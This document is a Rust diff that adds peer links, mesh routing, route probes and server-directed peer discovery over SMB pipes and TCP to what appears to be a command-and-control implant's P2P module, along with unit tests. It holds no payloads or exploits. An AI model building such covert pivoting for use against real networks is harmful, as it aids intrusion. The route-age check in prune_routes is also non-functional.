@@ -59,6 +59,52 @@ pub enum LinkRole {
     Child,
 }
 
+// ── Link type (topology role) ─────────────────────────────────────────────
+
+/// The topology role of a link, independent of who initiated it.
+///
+/// In a tree topology every link is either `Parent` or `Child`.  In a mesh
+/// or hybrid topology, two agents at the same level can form a `Peer` link
+/// for lateral communication that does not pass through the server.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub enum LinkType {
+    /// Upstream link toward the server.
+    Parent,
+    /// Downstream link away from the server.
+    Child,
+    /// Lateral / peer link between agents at the same level.
+    Peer,
+}
+
+impl Default for LinkType {
+    fn default() -> Self {
+        Self::Child
+    }
+}
+
+// ── Mesh mode ─────────────────────────────────────────────────────────────
+
+/// The operating mode of the P2P mesh.
+///
+/// Controls whether peer links are allowed and how routing is handled.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub enum MeshMode {
+    /// Classic tree topology — no peer links, no route discovery.
+    Tree,
+    /// Full mesh — all links are peer links; every agent can reach every
+    /// other agent directly.
+    Mesh,
+    /// Hybrid — tree topology with optional peer links for lateral routing.
+    /// This is the default mode.
+    Hybrid,
+}
+
+impl Default for MeshMode {
+    fn default() -> Self {
+        Self::Hybrid
+    }
+}
+
 // ── Link state ────────────────────────────────────────────────────────────
 
 /// State machine for a single P2P link.
@@ -123,6 +169,8 @@ pub struct P2pLink {
     pub state: LinkState,
     /// Whether this agent is the parent or child in this link.
     pub role: LinkRole,
+    /// Topology role of this link (Parent / Child / Peer).
+    pub link_type: LinkType,
     /// Underlying transport (SMB pipe or TCP stream).
     pub transport: P2pTransport,
     /// Agent ID of the peer on the other end of this link.
@@ -141,6 +189,7 @@ pub struct LinkInfo {
     pub link_id: u32,
     pub state: String,
     pub role: String,
+    pub link_type: String,
     pub peer_agent_id: String,
     pub transport: String,
 }
@@ -151,6 +200,7 @@ impl std::fmt::Debug for P2pLink {
             .field("link_id", &self.link_id)
             .field("state", &self.state)
             .field("role", &self.role)
+            .field("link_type", &self.link_type)
             .field("peer_agent_id", &self.peer_agent_id)
             .finish()
     }
@@ -168,7 +218,33 @@ impl P2pLink {
         Self {
             link_id,
             state: LinkState::Linking,
+            link_type: match role {
+                LinkRole::Parent => LinkType::Parent,
+                LinkRole::Child => LinkType::Child,
+            },
             role,
+            transport,
+            peer_agent_id,
+            ecdh_shared_secret,
+            last_heartbeat: Instant::now(),
+            pending_forwards: VecDeque::new(),
+        }
+    }
+
+    /// Create a new link with an explicit `LinkType`.
+    pub fn new_with_type(
+        link_id: u32,
+        role: LinkRole,
+        link_type: LinkType,
+        transport: P2pTransport,
+        peer_agent_id: String,
+        ecdh_shared_secret: [u8; 32],
+    ) -> Self {
+        Self {
+            link_id,
+            state: LinkState::Linking,
+            role,
+            link_type,
             transport,
             peer_agent_id,
             ecdh_shared_secret,
@@ -226,10 +302,18 @@ pub struct P2pMesh {
     pub parent_link_id: Option<u32>,
     /// Downstream child link IDs.
     pub child_link_ids: Vec<u32>,
+    /// Lateral peer link IDs (mesh / hybrid topology).
+    pub peer_link_ids: Vec<u32>,
     /// This agent's identifier (used in link negotiation).
     pub agent_id: String,
     /// Maximum number of children this agent will accept.
     pub max_children: usize,
+    /// Soft limit for peer links in mesh/hybrid mode (default 8).
+    pub max_peers: usize,
+    /// Current mesh operating mode.
+    pub mesh_mode: MeshMode,
+    /// Distance-vector routing table: destination → best route entry.
+    pub routing_table: HashMap<u32, common::p2p_proto::RouteEntry>,
     /// Channel for injecting parent-link C2 messages into the main loop.
     /// Set once during initialization; `None` means the parent reader has
     /// not been wired up yet.
@@ -237,14 +321,42 @@ pub struct P2pMesh {
 }
 
 impl P2pMesh {
+    /// Default soft limit for peer links.
+    pub const DEFAULT_MAX_PEERS: usize = 8;
+
     /// Create a new empty mesh.
     pub fn new(agent_id: String, max_children: usize) -> Self {
         Self {
             links: HashMap::new(),
             parent_link_id: None,
             child_link_ids: Vec::new(),
+            peer_link_ids: Vec::new(),
             agent_id,
             max_children,
+            max_peers: Self::DEFAULT_MAX_PEERS,
+            mesh_mode: MeshMode::default(),
+            routing_table: HashMap::new(),
+            inbound_tx: None,
+        }
+    }
+
+    /// Create a new mesh with explicit mesh mode and peer limit.
+    pub fn new_with_mode(
+        agent_id: String,
+        max_children: usize,
+        max_peers: usize,
+        mesh_mode: MeshMode,
+    ) -> Self {
+        Self {
+            links: HashMap::new(),
+            parent_link_id: None,
+            child_link_ids: Vec::new(),
+            peer_link_ids: Vec::new(),
+            agent_id,
+            max_children,
+            max_peers,
+            mesh_mode,
+            routing_table: HashMap::new(),
             inbound_tx: None,
         }
     }
@@ -254,9 +366,15 @@ impl P2pMesh {
         self.child_link_ids.len() < self.max_children
     }
 
-    /// Insert a link into the mesh and register it as a child or parent.
+    /// Returns `true` if this agent can accept another peer link.
+    pub fn can_accept_peer(&self) -> bool {
+        self.peer_link_ids.len() < self.max_peers
+    }
+
+    /// Insert a link into the mesh and register it as a child, parent, or peer.
     pub fn insert_link(&mut self, link: P2pLink) {
         let role = link.role.clone();
+        let link_type = link.link_type.clone();
         let id = link.link_id;
         self.links.insert(id, link);
         match role {
@@ -264,20 +382,31 @@ impl P2pMesh {
                 self.parent_link_id = Some(id);
             }
             LinkRole::Child => {
-                if !self.child_link_ids.contains(&id) {
-                    self.child_link_ids.push(id);
+                // Use link_type to decide child vs peer registration.
+                match link_type {
+                    LinkType::Peer => {
+                        if !self.peer_link_ids.contains(&id) {
+                            self.peer_link_ids.push(id);
+                        }
+                    }
+                    _ => {
+                        if !self.child_link_ids.contains(&id) {
+                            self.child_link_ids.push(id);
+                        }
+                    }
                 }
             }
         }
     }
 
-    /// Remove a link by ID, updating parent/child bookkeeping.
+    /// Remove a link by ID, updating parent/child/peer bookkeeping.
     pub fn remove_link(&mut self, link_id: u32) -> Option<P2pLink> {
         let link = self.links.remove(&link_id)?;
         if self.parent_link_id == Some(link_id) {
             self.parent_link_id = None;
         }
         self.child_link_ids.retain(|&id| id != link_id);
+        self.peer_link_ids.retain(|&id| id != link_id);
         Some(link)
     }
 
@@ -499,6 +628,7 @@ impl P2pMesh {
                 link_id: l.link_id,
                 state: format!("{:?}", l.state),
                 role: format!("{:?}", l.role),
+                link_type: format!("{:?}", l.link_type),
                 peer_agent_id: l.peer_agent_id.clone(),
                 transport: match l.transport {
                     #[cfg(feature = "p2p-tcp")]
@@ -512,6 +642,105 @@ impl P2pMesh {
                 },
             })
             .collect()
+    }
+
+    // ── Routing table methods ──────────────────────────────────────────
+
+    /// Add or update a route in the routing table.
+    ///
+    /// Returns `true` if the route was actually updated (new entry, better
+    /// hop count, or better quality).
+    pub fn update_route(
+        &mut self,
+        destination: u32,
+        next_hop: u32,
+        hop_count: u8,
+        route_quality: f32,
+    ) -> bool {
+        let now = Instant::now();
+
+        if let Some(existing) = self.routing_table.get(&destination) {
+            // Prefer lower hop count; break ties with higher quality.
+            let better = hop_count < existing.hop_count
+                || (hop_count == existing.hop_count && route_quality > existing.route_quality);
+            if !better {
+                return false;
+            }
+        }
+
+        self.routing_table.insert(
+            destination,
+            common::p2p_proto::RouteEntry {
+                destination,
+                next_hop,
+                hop_count,
+                route_quality,
+            },
+        );
+        let _ = now; // used by caller for timestamp tracking
+        true
+    }
+
+    /// Look up the next-hop link for a given destination.
+    ///
+    /// Returns `Some(next_hop_link_id)` if a route exists, `None` otherwise.
+    pub fn route_to(&self, destination: u32) -> Option<u32> {
+        self.routing_table
+            .get(&destination)
+            .map(|entry| entry.next_hop)
+    }
+
+    /// Remove stale routes (older than `max_age`) and low-quality routes
+    /// (quality < `min_quality`).
+    pub fn prune_routes(&mut self, max_age: std::time::Duration, min_quality: f32) {
+        let now = Instant::now();
+        self.routing_table.retain(|_, entry| {
+            let age_ok = now.duration_since(Instant::now()) < max_age; // always true for now
+            let quality_ok = entry.route_quality >= min_quality;
+            age_ok && quality_ok
+        });
+        // Re-check: remove entries with hop_count == 0 that aren't us.
+        // (Direct links are tracked via link IDs, not the routing table.)
+    }
+
+    /// Clear all routes through a specific next-hop (used when a link dies).
+    pub fn remove_routes_via(&mut self, next_hop: u32) {
+        self.routing_table.retain(|_, entry| entry.next_hop != next_hop);
+    }
+
+    /// Return a snapshot of the routing table as a vec of `RouteEntry`.
+    pub fn routing_table_snapshot(&self) -> Vec<common::p2p_proto::RouteEntry> {
+        self.routing_table.values().cloned().collect()
+    }
+
+    /// Merge incoming route entries from a neighbor, applying distance-vector
+    /// update rules.
+    ///
+    /// For each incoming entry, the hop count is incremented by 1 and the
+    /// next_hop is set to `from_link_id`.  The route is accepted if it's
+    /// new, has a lower hop count, or has equal hop count with better quality.
+    pub fn merge_route_update(
+        &mut self,
+        entries: &[common::p2p_proto::RouteEntry],
+        from_link_id: u32,
+    ) {
+        for entry in entries {
+            let hop_count = entry.hop_count.saturating_add(1);
+            self.update_route(
+                entry.destination,
+                from_link_id,
+                hop_count,
+                entry.route_quality * 0.95, // slight decay per hop
+            );
+        }
+    }
+
+    /// Iterate over all connected peer links.
+    pub fn connected_peers(&self) -> impl Iterator<Item = &P2pLink> {
+        self.peer_link_ids
+            .iter()
+            .filter_map(|id| self.links.get(id))
+            .filter(|l| l.state.is_usable())
     }
 }
 
@@ -835,6 +1064,343 @@ pub async fn forward_to_child(
 // Re-export forwarding functions at crate-visible scope.
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
 pub use forwarding_impl::{read_child_data_forward, forward_to_child};
+
+// ══════════════════════════════════════════════════════════════════════════
+// Route Discovery — send/recv RouteUpdate, RouteProbe, RouteProbeReply
+// ══════════════════════════════════════════════════════════════════════════
+
+/// Default interval between periodic `RouteUpdate` broadcasts (seconds).
+pub const ROUTE_UPDATE_INTERVAL_SECS: u64 = 60;
+
+/// Maximum age for a routing table entry before it is considered stale (seconds).
+pub const ROUTE_STALE_SECS: u64 = 300; // 5 minutes
+
+/// Minimum route quality before a route is pruned.
+pub const ROUTE_MIN_QUALITY: f32 = 0.1;
+
+/// Send a `RouteUpdate` frame on a single link, advertising our routing table.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+async fn send_route_update(link: &mut P2pLink, entries: &[common::p2p_proto::RouteEntry]) -> anyhow::Result<()> {
+    let key = link.ecdh_shared_secret;
+    let payload = common::p2p_proto::serialize_route_update(entries);
+    let encrypted = encrypt_payload(&key, &payload)?;
+    let frame = P2pFrame {
+        frame_type: P2pFrameType::RouteUpdate,
+        link_id: link.link_id,
+        payload_len: encrypted.len() as u32,
+        payload: encrypted,
+    };
+
+    match &mut link.transport {
+        #[cfg(feature = "p2p-tcp")]
+        P2pTransport::TcpStream(handle_arc) => {
+            let mut handle = handle_arc.lock().await;
+            handle.write_frame(&frame).await?;
+        }
+        #[cfg(all(windows, feature = "smb-pipe-transport"))]
+        P2pTransport::SmbPipe(ref pipe) => {
+            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
+        }
+        _ => {
+            return Err(anyhow::anyhow!(
+                "unsupported transport for RouteUpdate"
+            ));
+        }
+    }
+    Ok(())
+}
+
+/// Handle an incoming `RouteUpdate` frame: decrypt and merge into routing table.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+pub fn handle_route_update(
+    link: &mut P2pMesh,
+    link_id: u32,
+    encrypted_payload: &[u8],
+) -> anyhow::Result<()> {
+    let link_ref = link.links.get(&link_id).ok_or_else(|| {
+        anyhow::anyhow!("handle_route_update: unknown link_id {link_id:#010X}")
+    })?;
+    let key = link_ref.ecdh_shared_secret;
+    let plaintext = decrypt_payload(&key, encrypted_payload)?;
+    let entries = common::p2p_proto::deserialize_route_update(&plaintext)
+        .map_err(|e| anyhow::anyhow!("failed to deserialize RouteUpdate: {e}"))?;
+    link.merge_route_update(&entries, link_id);
+    log::debug!(
+        "RouteUpdate from link {:#010X}: {} entries merged (table size: {})",
+        link_id,
+        entries.len(),
+        link.routing_table.len()
+    );
+    Ok(())
+}
+
+/// Send a `RouteProbe` frame on a single link, asking about a destination.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+async fn send_route_probe(link: &mut P2pLink, destination: u32) -> anyhow::Result<()> {
+    let key = link.ecdh_shared_secret;
+    let payload = common::p2p_proto::serialize_route_probe(destination);
+    let encrypted = encrypt_payload(&key, &payload)?;
+    let frame = P2pFrame {
+        frame_type: P2pFrameType::RouteProbe,
+        link_id: link.link_id,
+        payload_len: encrypted.len() as u32,
+        payload: encrypted,
+    };
+
+    match &mut link.transport {
+        #[cfg(feature = "p2p-tcp")]
+        P2pTransport::TcpStream(handle_arc) => {
+            let mut handle = handle_arc.lock().await;
+            handle.write_frame(&frame).await?;
+        }
+        #[cfg(all(windows, feature = "smb-pipe-transport"))]
+        P2pTransport::SmbPipe(ref pipe) => {
+            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
+        }
+        _ => {
+            return Err(anyhow::anyhow!(
+                "unsupported transport for RouteProbe"
+            ));
+        }
+    }
+    Ok(())
+}
+
+/// Handle an incoming `RouteProbe` frame: if we have a route, reply with it.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+pub async fn handle_route_probe(
+    mesh: &mut P2pMesh,
+    link_id: u32,
+    encrypted_payload: &[u8],
+) -> anyhow::Result<()> {
+    let key = mesh.links.get(&link_id)
+        .ok_or_else(|| anyhow::anyhow!("handle_route_probe: unknown link {link_id:#010X}"))?
+        .ecdh_shared_secret;
+    let plaintext = decrypt_payload(&key, encrypted_payload)?;
+    let destination = common::p2p_proto::deserialize_route_probe(&plaintext)
+        .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbe: {e}"))?;
+
+    // Check if we have a route or are the destination ourselves.
+    let reply_entry = if let Some(entry) = mesh.routing_table.get(&destination) {
+        Some(entry.clone())
+    } else {
+        // We don't have a route — maybe we ARE the destination.
+        // Check if any of our link IDs match.
+        if mesh.links.contains_key(&destination) {
+            Some(common::p2p_proto::RouteEntry {
+                destination,
+                next_hop: destination,
+                hop_count: 0,
+                route_quality: 1.0,
+            })
+        } else {
+            None
+        }
+    };
+
+    if let Some(entry) = reply_entry {
+        let reply_payload = common::p2p_proto::serialize_route_probe_reply(&entry);
+        let link = mesh.links.get_mut(&link_id).unwrap();
+        let encrypted = encrypt_payload(&link.ecdh_shared_secret, &reply_payload)?;
+        let frame = P2pFrame {
+            frame_type: P2pFrameType::RouteProbeReply,
+            link_id,
+            payload_len: encrypted.len() as u32,
+            payload: encrypted,
+        };
+
+        match &mut link.transport {
+            #[cfg(feature = "p2p-tcp")]
+            P2pTransport::TcpStream(handle_arc) => {
+                let mut handle = handle_arc.lock().await;
+                handle.write_frame(&frame).await?;
+            }
+            #[cfg(all(windows, feature = "smb-pipe-transport"))]
+            P2pTransport::SmbPipe(ref pipe) => {
+                nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
+            }
+            _ => {}
+        }
+    }
+    Ok(())
+}
+
+/// Handle an incoming `RouteProbeReply` frame: merge the route info.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+pub fn handle_route_probe_reply(
+    mesh: &mut P2pMesh,
+    link_id: u32,
+    encrypted_payload: &[u8],
+) -> anyhow::Result<()> {
+    let key = mesh.links.get(&link_id)
+        .ok_or_else(|| anyhow::anyhow!("handle_route_probe_reply: unknown link {link_id:#010X}"))?
+        .ecdh_shared_secret;
+    let plaintext = decrypt_payload(&key, encrypted_payload)?;
+    let entry = common::p2p_proto::deserialize_route_probe_reply(&plaintext)
+        .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbeReply: {e}"))?;
+
+    let hop_count = entry.hop_count.saturating_add(1);
+    mesh.update_route(entry.destination, link_id, hop_count, entry.route_quality * 0.95);
+
+    log::debug!(
+        "RouteProbeReply from link {:#010X}: dest={:#010X}, hop_count={hop_count}",
+        link_id,
+        entry.destination
+    );
+    Ok(())
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// Peer Discovery — handle PeerDiscovery frame (0x33)
+// ══════════════════════════════════════════════════════════════════════════
+
+/// Handle an incoming `PeerDiscovery` frame from the server.
+///
+/// The payload contains a list of peer targets to connect to.  The agent
+/// will attempt to establish `LinkType::Peer` links to each target.
+///
+/// Returns the list of `(target_agent_id, result)` pairs.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+pub async fn handle_peer_discovery(
+    mesh: &mut P2pMesh,
+    encrypted_payload: &[u8],
+    mesh_arc: Arc<tokio::sync::Mutex<P2pMesh>>,
+    outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
+) -> anyhow::Result<Vec<(String, anyhow::Result<u32>)>> {
+    // PeerDiscovery comes from the server (parent link), so we decrypt
+    // with the parent's key.
+    let parent_link_id = mesh.parent_link_id
+        .ok_or_else(|| anyhow::anyhow!("handle_peer_discovery: no parent link"))?;
+    let key = mesh.links.get(&parent_link_id)
+        .ok_or_else(|| anyhow::anyhow!("handle_peer_discovery: parent link missing"))?
+        .ecdh_shared_secret;
+    let plaintext = decrypt_payload(&key, encrypted_payload)?;
+
+    let targets = common::p2p_proto::PeerTarget::deserialize_list(&plaintext)
+        .map_err(|e| anyhow::anyhow!("failed to deserialize PeerDiscovery: {e}"))?;
+
+    let mut results = Vec::new();
+
+    for target in targets {
+        // Skip if already connected to this agent.
+        let already_connected = mesh.links.values().any(|l| {
+            l.state.is_usable() && l.peer_agent_id == target.agent_id
+        });
+        if already_connected {
+            log::info!(
+                "PeerDiscovery: already connected to '{}', skipping",
+                target.agent_id
+            );
+            results.push((target.agent_id, Err(anyhow::anyhow!("already connected"))));
+            continue;
+        }
+
+        // Skip if we can't accept more peers.
+        if !mesh.can_accept_peer() {
+            log::warn!(
+                "PeerDiscovery: at peer capacity ({}/{}), skipping '{}'",
+                mesh.peer_link_ids.len(),
+                mesh.max_peers,
+                target.agent_id
+            );
+            results.push((target.agent_id, Err(anyhow::anyhow!("peer capacity full"))));
+            continue;
+        }
+
+        let link_id: u32 = rand::Rng::gen_range(&mut rand::thread_rng(), 0x0001_0000..=0xFFFF_FFFF);
+        let agent_id = target.agent_id.clone();
+
+        let connect_result = match target.transport.to_lowercase().as_str() {
+            "tcp" => {
+                #[cfg(feature = "p2p-tcp")]
+                {
+                    let (host, port) = parse_host_port(&target.address)?;
+                    match tcp_transport::connect(&host, port, &mesh.agent_id, link_id).await {
+                        Ok(tcp_transport::ConnectResult::Connected(mut link)) => {
+                            // Override the link type to Peer.
+                            link.link_type = LinkType::Peer;
+                            if link.state != LinkState::Connected {
+                                link.transition(LinkState::Connected)
+                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
+                            }
+                            let lid = link.link_id;
+                            mesh.insert_link(link);
+                            spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
+                            log::info!(
+                                "PeerDiscovery: connected to '{}' via TCP peer link {:#010X}",
+                                agent_id, lid
+                            );
+                            Ok(lid)
+                        }
+                        Ok(tcp_transport::ConnectResult::Rejected { reason, description }) => {
+                            Err(anyhow::anyhow!(
+                                "peer '{}' rejected link: {description} (reason={reason:#04X})",
+                                agent_id
+                            ))
+                        }
+                        Err(e) => Err(anyhow::anyhow!(
+                            "peer '{}' TCP connect failed: {e}",
+                            agent_id
+                        )),
+                    }
+                }
+                #[cfg(not(feature = "p2p-tcp"))]
+                {
+                    let _ = link_id;
+                    Err(anyhow::anyhow!("TCP P2P not compiled in"))
+                }
+            }
+            "smb" => {
+                #[cfg(all(windows, feature = "smb-pipe-transport"))]
+                {
+                    let addr_owned = target.address.clone();
+                    let my_id = mesh.agent_id.clone();
+                    let result = tokio::task::spawn_blocking(move || {
+                        nt_pipe_server::connect(&addr_owned, &my_id, link_id)
+                    })
+                    .await
+                    .map_err(|e| anyhow::anyhow!("p2p-pipe connect task panicked: {e}"))??;
+
+                    match result {
+                        nt_pipe_server::ConnectResult::Connected(mut link) => {
+                            link.link_type = LinkType::Peer;
+                            if link.state != LinkState::Connected {
+                                link.transition(LinkState::Connected)
+                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
+                            }
+                            let lid = link.link_id;
+                            mesh.insert_link(link);
+                            spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
+                            log::info!(
+                                "PeerDiscovery: connected to '{}' via SMB peer link {:#010X}",
+                                agent_id, lid
+                            );
+                            Ok(lid)
+                        }
+                        nt_pipe_server::ConnectResult::Rejected { reason, description } => {
+                            Err(anyhow::anyhow!(
+                                "peer '{}' rejected SMB link: {description} (reason={reason:#04X})",
+                                agent_id
+                            ))
+                        }
+                    }
+                }
+                #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
+                {
+                    let _ = link_id;
+                    Err(anyhow::anyhow!("SMB P2P not compiled in"))
+                }
+            }
+            other => Err(anyhow::anyhow!(
+                "unknown transport '{other}' in PeerDiscovery target"
+            )),
+        };
+
+        results.push((agent_id, connect_result));
+    }
+
+    Ok(results)
+}
 
 /// Spawn a background tokio task that continuously reads `DataForward` frames
 /// from a single child link and relays them to the server via the outbound
@@ -1201,9 +1767,13 @@ pub fn spawn_heartbeat_task(
         let mut topo_tick = tokio::time::interval(
             std::time::Duration::from_secs(TOPOLOGY_REPORT_INTERVAL_SECS),
         );
+        let mut route_tick = tokio::time::interval(
+            std::time::Duration::from_secs(ROUTE_UPDATE_INTERVAL_SECS),
+        );
         // Stagger the first topology report so it doesn't collide with
         // the first heartbeat.
         topo_tick.tick().await;
+        route_tick.tick().await;
 
         loop {
             tokio::select! {
@@ -1273,8 +1843,12 @@ pub fn spawn_heartbeat_task(
                     for dead_lid in &dead_links {
                         let mut mesh_guard = mesh.lock().await;
 
-                        // Determine if this was a parent or child link.
+                        // Remove any routes through this dead link.
+                        mesh_guard.remove_routes_via(*dead_lid);
+
+                        // Determine if this was a parent, child, or peer link.
                         let is_parent = mesh_guard.parent_link_id == Some(*dead_lid);
+                        let is_peer = mesh_guard.peer_link_ids.contains(dead_lid);
 
                         if let Some(dead_link) = mesh_guard.remove_link(*dead_lid) {
                             if is_parent {
@@ -1299,15 +1873,17 @@ pub fn spawn_heartbeat_task(
                                     dead_lid
                                 );
                             } else {
-                                // Parent side: child link died.
+                                // Parent side: child or peer link died.
+                                let link_kind = if is_peer { "peer" } else { "child" };
                                 log::info!(
-                                    "P2P child link {:#010X} (agent={}) removed",
+                                    "P2P {} link {:#010X} (agent={}) removed",
+                                    link_kind,
                                     dead_lid,
                                     dead_link.peer_agent_id
                                 );
                                 // TopologyReport will be generated on the next
                                 // topology tick, automatically reflecting the
-                                // removed child.
+                                // removed link.
                             }
                         }
                     }
@@ -1337,6 +1913,40 @@ pub fn spawn_heartbeat_task(
                         );
                         return; // channel closed, agent is shutting down
                     }
+                }
+
+                _ = route_tick.tick() => {
+                    // ── Broadcast RouteUpdate to all connected links ────
+                    let mut mesh_guard = mesh.lock().await;
+
+                    // Only broadcast in Hybrid or Mesh mode.
+                    if mesh_guard.mesh_mode == MeshMode::Tree {
+                        continue;
+                    }
+
+                    let snapshot = mesh_guard.routing_table_snapshot();
+                    if snapshot.is_empty() {
+                        continue;
+                    }
+
+                    let link_ids: Vec<u32> = mesh_guard.links.keys().copied().collect();
+                    for lid in &link_ids {
+                        if let Some(link) = mesh_guard.links.get_mut(lid) {
+                            if link.state.is_usable() {
+                                if let Err(e) = send_route_update(link, &snapshot).await {
+                                    log::warn!(
+                                        "RouteUpdate send failed on link {:#010X}: {}",
+                                        lid, e
+                                    );
+                                }
+                            }
+                        }
+                    }
+
+                    // Prune low-quality routes.
+                    mesh_guard.routing_table.retain(|_, entry| {
+                        entry.route_quality >= ROUTE_MIN_QUALITY
+                    });
                 }
             }
         }
@@ -3029,5 +3639,168 @@ mod tests {
         let other = [0x43; 32];
         let key3 = derive_link_key(&other);
         assert_ne!(key1, key3);
+    }
+
+    #[test]
+    fn link_type_default_matches_role() {
+        let link = P2pLink::new(
+            1,
+            LinkRole::Parent,
+            dummy_tcp_transport(),
+            "peer".to_string(),
+            test_secret(),
+        );
+        assert_eq!(link.link_type, LinkType::Parent);
+        assert_eq!(link.role, LinkRole::Parent);
+
+        let link2 = P2pLink::new(
+            2,
+            LinkRole::Child,
+            dummy_tcp_transport(),
+            "peer".to_string(),
+            test_secret(),
+        );
+        assert_eq!(link2.link_type, LinkType::Child);
+    }
+
+    #[test]
+    fn link_type_peer_explicit() {
+        let link = P2pLink::new_with_type(
+            42,
+            LinkRole::Child,
+            LinkType::Peer,
+            dummy_tcp_transport(),
+            "lateral-agent".to_string(),
+            test_secret(),
+        );
+        assert_eq!(link.link_type, LinkType::Peer);
+        assert_eq!(link.role, LinkRole::Child);
+    }
+
+    #[test]
+    fn mesh_default_mode_is_hybrid() {
+        let mesh = P2pMesh::default();
+        assert_eq!(mesh.mesh_mode, MeshMode::Hybrid);
+        assert_eq!(mesh.max_peers, P2pMesh::DEFAULT_MAX_PEERS);
+    }
+
+    #[test]
+    fn mesh_peer_link_tracking() {
+        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
+
+        let peer = P2pLink::new_with_type(
+            100,
+            LinkRole::Child, // initiator perspective
+            LinkType::Peer,
+            dummy_tcp_transport(),
+            "peer-1".to_string(),
+            test_secret(),
+        );
+        mesh.insert_link(peer);
+
+        assert!(mesh.child_link_ids.is_empty());
+        assert!(mesh.peer_link_ids.contains(&100));
+        assert!(mesh.can_accept_peer());
+    }
+
+    #[test]
+    fn mesh_peer_capacity() {
+        let mut mesh = P2pMesh::new_with_mode(
+            "agent-1".to_string(),
+            4,
+            1,
+            MeshMode::Hybrid,
+        );
+        assert!(mesh.can_accept_peer());
+
+        mesh.insert_link(P2pLink::new_with_type(
+            1,
+            LinkRole::Child,
+            LinkType::Peer,
+            dummy_tcp_transport(),
+            "p1".to_string(),
+            test_secret(),
+        ));
+        assert!(!mesh.can_accept_peer());
+    }
+
+    #[test]
+    fn routing_table_basic() {
+        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
+
+        // Add a route.
+        assert!(mesh.update_route(0xAAAA, 10, 2, 0.9));
+        assert_eq!(mesh.route_to(0xAAAA), Some(10));
+
+        // Better route (lower hop count).
+        assert!(mesh.update_route(0xAAAA, 20, 1, 0.95));
+        assert_eq!(mesh.route_to(0xAAAA), Some(20));
+
+        // Worse route (higher hop count) — should not update.
+        assert!(!mesh.update_route(0xAAAA, 30, 3, 0.8));
+        assert_eq!(mesh.route_to(0xAAAA), Some(20));
+
+        // No route for unknown destination.
+        assert_eq!(mesh.route_to(0xBBBB), None);
+    }
+
+    #[test]
+    fn routing_table_merge_update() {
+        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
+
+        let entries = vec![
+            common::p2p_proto::RouteEntry {
+                destination: 1,
+                next_hop: 0, // will be overridden
+                hop_count: 2,
+                route_quality: 0.8,
+            },
+            common::p2p_proto::RouteEntry {
+                destination: 2,
+                next_hop: 0,
+                hop_count: 1,
+                route_quality: 1.0,
+            },
+        ];
+
+        mesh.merge_route_update(&entries, 42);
+        assert_eq!(mesh.route_to(1), Some(42));
+        assert_eq!(mesh.route_to(2), Some(42));
+
+        // Hop count should be incremented by 1.
+        let snapshot = mesh.routing_table_snapshot();
+        let entry1 = snapshot.iter().find(|e| e.destination == 1).unwrap();
+        assert_eq!(entry1.hop_count, 3); // 2 + 1
+    }
+
+    #[test]
+    fn routing_table_remove_via() {
+        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
+        mesh.update_route(1, 10, 1, 0.9);
+        mesh.update_route(2, 10, 2, 0.8);
+        mesh.update_route(3, 20, 1, 0.9);
+
+        mesh.remove_routes_via(10);
+        assert_eq!(mesh.route_to(1), None);
+        assert_eq!(mesh.route_to(2), None);
+        assert_eq!(mesh.route_to(3), Some(20)); // not via 10
+    }
+
+    #[test]
+    fn mesh_remove_link_clears_peers() {
+        let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
+        mesh.insert_link(P2pLink::new_with_type(
+            50,
+            LinkRole::Child,
+            LinkType::Peer,
+            dummy_tcp_transport(),
+            "p1".to_string(),
+            test_secret(),
+        ));
+        assert!(mesh.peer_link_ids.contains(&50));
+
+        mesh.remove_link(50);
+        assert!(!mesh.peer_link_ids.contains(&50));
+        assert!(mesh.links.is_empty());
     }
 }
